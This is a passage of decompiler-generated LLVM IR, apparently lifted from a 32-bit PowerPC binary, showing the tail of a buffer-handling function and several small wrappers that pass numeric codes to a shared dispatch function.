  %v0_1000e928 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e928 = urem i32 %v0_1000e928, 4
  store i32 %v1_1000e928, i32* %r0.global-to-local, align 4
  %v3_1000e928 = icmp eq i32 %v1_1000e928, 0
  %v0_1000e940.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000e928, label %dec_label_pc_1000e940, label %dec_label_pc_1000e930

dec_label_pc_1000e930:                            ; preds = %dec_label_pc_1000e920
  %v2_1000e930 = icmp ult i32 %v0_1000e940.pre, %v1_1000e928
  br i1 %v2_1000e930, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000e938

dec_label_pc_1000e938:                            ; preds = %dec_label_pc_1000e930
  %v2_1000e938 = sub i32 %v0_1000e940.pre, %v1_1000e928
  store i32 %v2_1000e938, i32* @r29, align 4
  %v0_1000e93c = load i32, i32* @r30, align 4
  %v2_1000e93c = add i32 %v0_1000e93c, %v1_1000e928
  store i32 %v2_1000e93c, i32* @r30, align 4
  br label %dec_label_pc_1000e940

dec_label_pc_1000e940:                            ; preds = %dec_label_pc_1000e920, %dec_label_pc_1000e938
  %v0_1000e940 = phi i32 [ %v2_1000e938, %dec_label_pc_1000e938 ], [ %v0_1000e940.pre, %dec_label_pc_1000e920 ]
  %v1_1000e948 = load i32, i32* @r24, align 4
  %v2_1000e948 = inttoptr i32 %v1_1000e948 to i32*
  store i32 -1, i32* %v2_1000e948, align 4
  %tmp29 = icmp ult i32 %v0_1000e940, 4
  br i1 %tmp29, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000e950

dec_label_pc_1000e950:                            ; preds = %dec_label_pc_1000e940
  %v0_1000e950 = load i32, i32* @r29, align 4
  %v1_1000e950 = add i32 %v0_1000e950, -4
  store i32 %v1_1000e950, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000e950, 8
  br i1 %tmp30, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000e95c

dec_label_pc_1000e95c:                            ; preds = %dec_label_pc_1000e950
  %v1_1000e95c = add i32 %v0_1000e950, -12
  store i32 %v1_1000e95c, i32* %r0.global-to-local, align 4
  %v0_1000e960 = load i32, i32* @r30, align 4
  %v1_1000e960 = add i32 %v0_1000e960, 4
  store i32 %v1_1000e960, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000e96c = inttoptr i32 %v1_1000e960 to i32*
  store i32 %v0_1000e960, i32* %v3_1000e96c, align 4
  %v0_1000e970 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e970 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000e970 = add i32 %v1_1000e970, 4
  %v3_1000e970 = inttoptr i32 %v2_1000e970 to i32*
  store i32 %v0_1000e970, i32* %v3_1000e970, align 4
  %tmp31 = icmp ult i32 %v1_1000e95c, 32
  br i1 %tmp31, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000e978

dec_label_pc_1000e978:                            ; preds = %dec_label_pc_1000e95c
  %v0_1000e978 = load i32, i32* @r29, align 4
  %v1_1000e978 = add i32 %v0_1000e978, -44
  %tmp32 = icmp ult i32 %v1_1000e978, 256
  br i1 %tmp32, label %dec_label_pc_1000ebb4, label %dec_label_pc_1000e984

dec_label_pc_1000e984:                            ; preds = %dec_label_pc_1000e978
  %v0_1000e984 = load i32, i32* @r30, align 4
  %v1_1000e984 = add i32 %v0_1000e984, 44
  store i32 %v1_1000e984, i32* @r31, align 4
  %v0_1000e988 = load i32, i32* @r23, align 4
  store i32 %v0_1000e988, i32* @r4, align 4
  %v1_1000e990 = add i32 %v0_1000e984, 12
  store i32 %v1_1000e990, i32* %r21.global-to-local, align 4
  store i32 %v1_1000e984, i32* %r3.global-to-local, align 4
  store i32 268495260, i32* @lr, align 4
  %v3_1000e998 = call i32 @function_1000e004(i32 %v1_1000e984, i32 %v0_1000e988, i32 %v1_1000e978)
  %v0_1000e99c = load i32, i32* @r31, align 4
  %v1_1000e99c = load i32, i32* @r30, align 4
  %v2_1000e99c = add i32 %v1_1000e99c, 12
  %v3_1000e99c = inttoptr i32 %v2_1000e99c to i32*
  store i32 %v0_1000e99c, i32* %v3_1000e99c, align 4
  %v0_1000e9a0 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e9a0 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000e9a0 = add i32 %v1_1000e9a0, 4
  %v3_1000e9a0 = inttoptr i32 %v2_1000e9a0 to i32*
  store i32 %v0_1000e9a0, i32* %v3_1000e9a0, align 4
  %v0_1000e9a4 = load i32, i32* @r23, align 4
  store i32 %v0_1000e9a4, i32* %r3.global-to-local, align 4
  %v0_1000e9a8 = load i32, i32* @r30, align 4
  store i32 %v0_1000e9a8, i32* @r4, align 4
  store i32 268495280, i32* @lr, align 4
  %v2_1000e9ac = inttoptr i32 %v0_1000e9a4 to i8*
  %v3_1000e9ac = call i32 @function_10011820(i8* %v2_1000e9ac)
  store i32 %v3_1000e9ac, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e9ac, i32* %r22.global-to-local, align 4
  %v3_1000e9b0 = icmp eq i32 %v3_1000e9ac, 0
  br i1 %v3_1000e9b0, label %dec_label_pc_1000e9e4, label %dec_label_pc_1000e9b8

dec_label_pc_1000e9b8:                            ; preds = %dec_label_pc_1000e984
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e9c0 = load i32, i32* @r26, align 4
  %v2_1000e9c0 = add i32 %v1_1000e9c0, 8
  %v3_1000e9c0 = inttoptr i32 %v2_1000e9c0 to i32*
  store i32 2, i32* %v3_1000e9c0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000e9c8 = load i32, i32* @r31, align 4
  %v1_1000e9c8 = load i32, i32* @r26, align 4
  %v2_1000e9c8 = inttoptr i32 %v1_1000e9c8 to i32*
  store i32 %v0_1000e9c8, i32* %v2_1000e9c8, align 4
  %v0_1000e9cc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e9cc = load i32, i32* @r26, align 4
  %v2_1000e9cc = add i32 %v1_1000e9cc, 12
  %v3_1000e9cc = inttoptr i32 %v2_1000e9cc to i32*
  store i32 %v0_1000e9cc, i32* %v3_1000e9cc, align 4
  %v0_1000e9d0 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000e9d0 = load i32, i32* @r26, align 4
  %v2_1000e9d0 = add i32 %v1_1000e9d0, 16
  %v3_1000e9d0 = inttoptr i32 %v2_1000e9d0 to i32*
  store i32 %v0_1000e9d0, i32* %v3_1000e9d0, align 4
  %v0_1000e9d4 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000e9d4 = load i32, i32* @r26, align 4
  %v2_1000e9d4 = add i32 %v1_1000e9d4, 4
  %v3_1000e9d4 = inttoptr i32 %v2_1000e9d4 to i32*
  store i32 %v0_1000e9d4, i32* %v3_1000e9d4, align 4
  %v0_1000e9d8 = load i32, i32* @r26, align 4
  %v1_1000e9d8 = load i32, i32* @r20, align 4
  %v2_1000e9d8 = inttoptr i32 %v1_1000e9d8 to i32*
  store i32 %v0_1000e9d8, i32* %v2_1000e9d8, align 4
  %v0_1000e9dc = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e9dc = load i32, i32* @r24, align 4
  %v2_1000e9dc = inttoptr i32 %v1_1000e9dc to i32*
  store i32 %v0_1000e9dc, i32* %v2_1000e9dc, align 4
  br label %dec_label_pc_1000ebb8

dec_label_pc_1000e9e4:                            ; preds = %dec_label_pc_1000e984
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268495340, i32* @lr, align 4
  %v0_1000e9e8 = call i32 @function_10011f7c()
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r29.global-to-local, align 4
  %v2_1000e9f0 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000e9f0, i32* %r28.global-to-local, align 4
  store i32 %v2_1000e9f0, i32* @r3, align 4
  %v0_1000ea04 = call i32 @function_10010048()
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ea0c = call i32 @function_10010040()
  %v3_1000ea14 = load i32, i32* @global_var_1002b964.751, align 4
  store i32 %v3_1000ea14, i32* %r29.global-to-local, align 4
  store i32 %v2_1000e9f0, i32* @r3, align 4
  %v0_1000ea20 = call i32 @function_10010048()
  %v0_1000ea28 = load i32, i32* @r23, align 4
  store i32 %v0_1000ea28, i32* %r3.global-to-local, align 4
  %v2_1000ea38 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000ea3c = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000ea40 = load i32, i32* %r22.global-to-local, align 4
  store i32 268495440, i32* @lr, align 4
  %v6_1000ea4c = inttoptr i32 %v0_1000ea28 to i8*
  %v7_1000ea4c = call i32 @function_100118e0(i8* %v6_1000ea4c, i32 1, i32 %v3_1000ea14, i32 ptrtoint (i32* @global_var_10031c60.752 to i32), i32 %v2_1000ea38, i32 %v2_1000ea3c)
  store i32 %v7_1000ea4c, i32* %r3.global-to-local, align 4
  %v1_1000ea50 = icmp slt i32 %v7_1000ea4c, 0
  br i1 %v1_1000ea50, label %dec_label_pc_1000eb98, label %dec_label_pc_1000ea58

dec_label_pc_1000ea58:                            ; preds = %dec_label_pc_1000e9e4
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000ea60 = add i32 %tmp19, 4
  %v2_1000ea64 = mul i32 %v0_1000ea40, %v1_1000ea60
  %v1_1000ea68 = add i32 %v2_1000ea64, 256
  %v1_1000ea6c = load i32, i32* @r27, align 4
  %v3_1000ea6c = icmp ugt i32 %v1_1000ea68, %v1_1000ea6c
  br i1 %v3_1000ea6c, label %dec_label_pc_1000ea74, label %dec_label_pc_1000ea90

dec_label_pc_1000ea74:                            ; preds = %dec_label_pc_1000ea58
  %v3_1000ea74 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ea74, i32* %r3.global-to-local, align 4
  store i32 268495484, i32* @lr, align 4
  %v1_1000ea78 = call i32 @function_1000f0b8(i32 %v3_1000ea74)
  %v3_1000ea7c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000ea7c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ea84.753 to i32), i32* @lr, align 4
  %v1_1000ea80 = call i32 @function_1000f0b8(i32 %v3_1000ea7c)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000ea88 = load i32, i32* @r19, align 4
  %v1_1000ea88 = load i32, i32* @r24, align 4
  %v2_1000ea88 = inttoptr i32 %v1_1000ea88 to i32*
  store i32 %v0_1000ea88, i32* %v2_1000ea88, align 4
  br label %dec_label_pc_1000ebb8

dec_label_pc_1000ea90:                            ; preds = %dec_label_pc_1000ea58
  %v3_1000ea90 = icmp eq i32 %v0_1000ea40, 0
  br i1 %v3_1000ea90, label %dec_label_pc_1000ea90.dec_label_pc_1000eb34_crit_edge, label %dec_label_pc_1000ea98

dec_label_pc_1000ea90.dec_label_pc_1000eb34_crit_edge: ; preds = %dec_label_pc_1000ea90
  %v0_1000eb3c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eb34

dec_label_pc_1000ea98:                            ; preds = %dec_label_pc_1000ea90
  %v2_1000ea98 = mul i32 %v0_1000ea40, %tmp19
  store i32 %v2_1000ea98, i32* @r5, align 4
  %v0_1000ea9c = load i32, i32* @r30, align 4
  %v1_1000ea9c = add i32 %v0_1000ea9c, 36
  store i32 %v1_1000ea9c, i32* %r3.global-to-local, align 4
  %v0_1000eaa0 = load i32, i32* @r31, align 4
  store i32 268495528, i32* @lr, align 4
  %v2_1000eaa4 = call i32 @function_10011470(i32 %v1_1000ea9c, i32 %v0_1000eaa0)
  store i32 %v2_1000eaa4, i32* %r3.global-to-local, align 4
  store i32 %v2_1000ea98, i32* %r0.global-to-local, align 4
  %v0_1000eab4 = load i32, i32* @r30, align 4
  %v1_1000eab4 = load i32, i32* @r31, align 4
  %v3_1000eab4 = add i32 %v1_1000eab4, %v2_1000ea98
  %v4_1000eab4 = inttoptr i32 %v3_1000eab4 to i32*
  store i32 %v0_1000eab4, i32* %v4_1000eab4, align 4
  %v0_1000eab8 = load i32, i32* @r31, align 4
  %v1_1000eab8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000eab8 = add i32 %v1_1000eab8, %v0_1000eab8
  store i32 %v2_1000eab8, i32* @r25, align 4
  %v1_1000eac0 = add i32 %v0_1000ea40, -1
  store i32 %v1_1000eac0, i32* %r11.global-to-local, align 4
  %v1_1000eac4 = add i32 %v0_1000ea40, 1
  %v2_1000eac8 = icmp sgt i32 %v1_1000eac0, -1
  store i32 %v1_1000eac4, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000eac8, label %dec_label_pc_1000eaf8.preheader, label %dec_label_pc_1000ead4

dec_label_pc_1000ead4:                            ; preds = %dec_label_pc_1000ea98
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000eaf8.preheader

dec_label_pc_1000eaf8.preheader:                  ; preds = %dec_label_pc_1000ead4, %dec_label_pc_1000ea98
  %v0_1000eb006 = phi i32 [ 1, %dec_label_pc_1000ead4 ], [ %v1_1000eac4, %dec_label_pc_1000ea98 ]
  %v1_1000eaf83 = mul i32 %v1_1000eac0, 4
  store i32 %v1_1000eaf83, i32* %r0.global-to-local, align 4
  %v2_1000eafc5 = add i32 %v2_1000eab8, %v1_1000eaf83
  %v1_1000eb007 = add i32 %v0_1000eb006, -1
  store i32 %v1_1000eb007, i32* %ctr.global-to-local, align 4
  %v2_1000eb008 = icmp eq i32 %v1_1000eb007, 0
  br i1 %v2_1000eb008, label %dec_label_pc_1000eb04, label %dec_label_pc_1000eae0

dec_label_pc_1000eae0:                            ; preds = %dec_label_pc_1000eaf8.preheader, %dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge
  %v1_1000eaf4 = phi i32 [ %v2_1000eafc, %dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge ], [ %v2_1000eafc5, %dec_label_pc_1000eaf8.preheader ]
  %v0_1000eaec = phi i32 [ %v0_1000eaec.pre, %dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge ], [ %v0_1000eab8, %dec_label_pc_1000eaf8.preheader ]
  %v0_1000eae4 = phi i32 [ %v0_1000eaf8, %dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge ], [ %v1_1000eac0, %dec_label_pc_1000eaf8.preheader ]
  %v2_1000eae4 = mul i32 %v0_1000eae4, %tmp19
  %v1_1000eae8 = add i32 %v0_1000eae4, -1
  store i32 %v1_1000eae8, i32* %r11.global-to-local, align 4
  %v2_1000eaec = add i32 %v0_1000eaec, -8
  %v1_1000eaf0 = add i32 %v2_1000eaec, %v2_1000eae4
  %v2_1000eaf4 = add i32 %v1_1000eaf4, 4
  %v3_1000eaf4 = inttoptr i32 %v2_1000eaf4 to i32*
  store i32 %v1_1000eaf0, i32* %v3_1000eaf4, align 4
  %v0_1000eaf8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eaf8 = mul i32 %v0_1000eaf8, 4
  store i32 %v1_1000eaf8, i32* %r0.global-to-local, align 4
  %v1_1000eafc = load i32, i32* @r25, align 4
  %v0_1000eb00 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb00 = add i32 %v0_1000eb00, -1
  store i32 %v1_1000eb00, i32* %ctr.global-to-local, align 4
  %v2_1000eb00 = icmp eq i32 %v1_1000eb00, 0
  br i1 %v2_1000eb00, label %dec_label_pc_1000eb04, label %dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge

dec_label_pc_1000eae0.dec_label_pc_1000eae0_crit_edge: ; preds = %dec_label_pc_1000eae0
  %v2_1000eafc = add i32 %v1_1000eafc, %v1_1000eaf8
  %v0_1000eaec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eae0

dec_label_pc_1000eb04:                            ; preds = %dec_label_pc_1000eae0, %dec_label_pc_1000eaf8.preheader
  %v1_1000eb10 = phi i32 [ %v2_1000eab8, %dec_label_pc_1000eaf8.preheader ], [ %v1_1000eafc, %dec_label_pc_1000eae0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000eb0c = mul i32 %v0_1000ea40, 4
  %v2_1000eb10 = add i32 %v1_1000eb0c, 4
  %v2_1000eb14 = add i32 %v2_1000eb10, %v1_1000eb10
  %v3_1000eb14 = inttoptr i32 %v2_1000eb14 to i32*
  store i32 0, i32* %v3_1000eb14, align 4
  %v0_1000eb20 = load i32, i32* @r25, align 4
  %v2_1000eb20 = add i32 %v0_1000eb20, %v1_1000eb0c
  store i32 %v2_1000eb20, i32* %r11.global-to-local, align 4
  %v1_1000eb24 = load i32, i32* @r31, align 4
  %v2_1000eb24 = sub i32 %v1_1000eb24, %v2_1000eb20
  %v1_1000eb28 = add i32 %v2_1000eb20, 8
  store i32 %v1_1000eb28, i32* @r31, align 4
  %v0_1000eb2c = load i32, i32* @r27, align 4
  %v2_1000eb2c = add i32 %v0_1000eb2c, %v2_1000eb24
  %v1_1000eb30 = add i32 %v2_1000eb2c, -8
  br label %dec_label_pc_1000eb34

dec_label_pc_1000eb34:                            ; preds = %dec_label_pc_1000ea90.dec_label_pc_1000eb34_crit_edge, %dec_label_pc_1000eb04
  %v0_1000eb3c = phi i32 [ %v0_1000eb3c.pre, %dec_label_pc_1000ea90.dec_label_pc_1000eb34_crit_edge ], [ %v1_1000eb28, %dec_label_pc_1000eb04 ]
  %v0_1000eb38 = phi i32 [ %v1_1000ea6c, %dec_label_pc_1000ea90.dec_label_pc_1000eb34_crit_edge ], [ %v1_1000eb30, %dec_label_pc_1000eb04 ]
  %v3_1000eb34 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000eb34, i32* @r4, align 4
  store i32 %v0_1000eb3c, i32* %r3.global-to-local, align 4
  store i32 268495684, i32* @lr, align 4
  %v3_1000eb40 = call i32 @function_1000e004(i32 %v0_1000eb3c, i32 %v3_1000eb34, i32 %v0_1000eb38)
  %v3_1000eb44 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000eb44, i32* %r3.global-to-local, align 4
  store i32 268495692, i32* @lr, align 4
  %v1_1000eb48 = call i32 @function_1000f0b8(i32 %v3_1000eb44)
  store i32 %v1_1000eb48, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000eb50 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000eb50, label %dec_label_pc_1000eb58, label %dec_label_pc_1000eba0

dec_label_pc_1000eb58:                            ; preds = %dec_label_pc_1000eb34
  store i32 4, i32* @r5, align 4
  %v0_1000eb60 = load i32, i32* @r30, align 4
  store i32 %v0_1000eb60, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000eb68.754 to i32), i32* @lr, align 4
  %v0_1000eb64 = call i32 @function_1000dcb0()
  %v1_1000eb6c = load i32, i32* @r26, align 4
  %v2_1000eb6c = add i32 %v1_1000eb6c, 8
  %v3_1000eb6c = inttoptr i32 %v2_1000eb6c to i32*
  store i32 2, i32* %v3_1000eb6c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000eb74 = load i32, i32* @r26, align 4
  %v2_1000eb74 = add i32 %v1_1000eb74, 12
  %v3_1000eb74 = inttoptr i32 %v2_1000eb74 to i32*
  store i32 4, i32* %v3_1000eb74, align 4
  %v0_1000eb78 = load i32, i32* @r31, align 4
  %v1_1000eb78 = load i32, i32* @r26, align 4
  %v2_1000eb78 = inttoptr i32 %v1_1000eb78 to i32*
  store i32 %v0_1000eb78, i32* %v2_1000eb78, align 4
  %v0_1000eb7c = load i32, i32* @r25, align 4
  %v1_1000eb7c = load i32, i32* @r26, align 4
  %v2_1000eb7c = add i32 %v1_1000eb7c, 16
  %v3_1000eb7c = inttoptr i32 %v2_1000eb7c to i32*
  store i32 %v0_1000eb7c, i32* %v3_1000eb7c, align 4
  %v0_1000eb80 = load i32, i32* @r21, align 4
  %v1_1000eb80 = load i32, i32* @r26, align 4
  %v2_1000eb80 = add i32 %v1_1000eb80, 4
  %v3_1000eb80 = inttoptr i32 %v2_1000eb80 to i32*
  store i32 %v0_1000eb80, i32* %v3_1000eb80, align 4
  %v3_1000eb84 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000eb84, i32* %r3.global-to-local, align 4
  store i32 268495756, i32* @lr, align 4
  %v1_1000eb88 = call i32 @function_1000f0b8(i32 %v3_1000eb84)
  store i32 %v1_1000eb88, i32* %r3.global-to-local, align 4
  %v0_1000eb8c = load i32, i32* @r26, align 4
  %v1_1000eb8c = load i32, i32* @r20, align 4
  %v2_1000eb8c = inttoptr i32 %v1_1000eb8c to i32*
  store i32 %v0_1000eb8c, i32* %v2_1000eb8c, align 4
  br label %dec_label_pc_1000eb98

dec_label_pc_1000eb98:                            ; preds = %dec_label_pc_1000eba0, %dec_label_pc_1000e9e4, %dec_label_pc_1000eb58
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000eb58 ], [ 2, %dec_label_pc_1000e9e4 ], [ 2, %dec_label_pc_1000eba0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000eb58 ], [ 1, %dec_label_pc_1000e9e4 ], [ 1, %dec_label_pc_1000eba0 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000eb98 = load i32, i32* @r24, align 4
  %v2_1000eb98 = inttoptr i32 %v1_1000eb98 to i32*
  store i32 %storemerge, i32* %v2_1000eb98, align 4
  br label %dec_label_pc_1000ebb8

dec_label_pc_1000eba0:                            ; preds = %dec_label_pc_1000eb34
  %v3_1000eba0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000eba0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000eba8.755 to i32), i32* @lr, align 4
  %v1_1000eba4 = call i32 @function_1000f0b8(i32 %v3_1000eba0)
  store i32 %v1_1000eba4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000eb98

dec_label_pc_1000ebb4:                            ; preds = %dec_label_pc_1000e950, %dec_label_pc_1000e940, %dec_label_pc_1000e930, %dec_label_pc_1000e978, %dec_label_pc_1000e95c
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ebb8

dec_label_pc_1000ebb8:                            ; preds = %dec_label_pc_1000e914, %dec_label_pc_1000e90c, %dec_label_pc_1000e8c0, %dec_label_pc_1000e888, %dec_label_pc_1000eb98, %dec_label_pc_1000ea74, %dec_label_pc_1000e9b8, %dec_label_pc_1000ebb4
  store i32 %v0_1000e88c, i32* %r0.global-to-local, align 4
  %v0_1000ebc8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ebc8

; uselistorder directives
  uselistorder i32 %v0_1000eb3c, { 1, 0 }
  uselistorder i32 %v1_1000eb0c, { 1, 0 }
  uselistorder i32 %v1_1000eb00, { 1, 0 }
  uselistorder i32 %v1_1000eaf8, { 1, 0 }
  uselistorder i32 %v0_1000eae4, { 1, 0 }
  uselistorder i32 %v1_1000eaf83, { 1, 0 }
  uselistorder i32 %v1_1000eac0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000eab8, { 1, 0, 2 }
  uselistorder i32 %v0_1000ea40, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000e984, { 1, 0, 2 }
  uselistorder i32 %v0_1000e940.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000e928, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 23, 3, 4, 5, 0, 6, 7, 8, 9, 10, 19, 15, 17, 16, 18, 20, 21, 22, 24, 2, 25, 26, 11, 12, 13, 14, 1 }
  uselistorder i32* %r29.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r28.global-to-local, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 13, 14, 1, 17, 15, 16, 18, 19, 5, 6, 7, 9, 10, 8, 11, 12 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i8*)* @function_10011820, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebb8, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000ebb4, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000eb98, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000eb34, { 1, 0 }
  uselistorder label %dec_label_pc_1000eae0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e940, { 1, 0 }
}

define i32 @function_1000ebcc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000ebcc:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ebe0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268495856, i32* @lr, align 4
  %v2_1000ebec = call i32 @function_100103cc(i32 3, i32 %v2_1000ebe0)
  ret i32 %v2_1000ebec

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000ec00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000ec00:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ec14 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268495908, i32* @lr, align 4
  %v2_1000ec20 = call i32 @function_100103cc(i32 6, i32 %v2_1000ec14)
  ret i32 %v2_1000ec20

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000ec34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000ec34:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ec48 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268495968, i32* @lr, align 4
  %v2_1000ec5c = call i32 @function_100103cc(i32 15, i32 %v2_1000ec48)
  ret i32 %v2_1000ec5c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000ec70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000ec70:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ec84 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496024, i32* @lr, align 4
  %v2_1000ec94 = call i32 @function_100103cc(i32 10, i32 %v2_1000ec84)
  ret i32 %v2_1000ec94

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000eca8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000eca8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ecbc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496080, i32* @lr, align 4
  %v2_1000eccc = call i32 @function_100103cc(i32 9, i32 %v2_1000ecbc)
  ret i32 %v2_1000eccc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_1000ece0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000ece0:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ecf4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268496144, i32* @lr, align 4
  %v2_1000ed0c = call i32 @function_100103cc(i32 11, i32 %v2_1000ecf4)
  ret i32 %v2_1000ed0c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000ed20(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000ed20:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ed34 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268496204, i32* @lr, align 4
  %v2_1000ed48 = call i32 @function_100103cc(i32 14, i32 %v2_1000ed34)
  ret i32 %v2_1000ed48

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @function_1000ed5c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000ed5c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ed70 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268496256, i32* @lr, align 4
  %v2_1000ed7c = call i32 @function_100103cc(i32 1, i32 %v2_1000ed70)
  ret i32 %v2_1000ed7c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_100103cc, { 2, 1, 6, 3, 4, 5, 7, 0 }
}

define i32 @function_1000ed90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ed90:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000edc0, label %dec_label_pc_1000edac

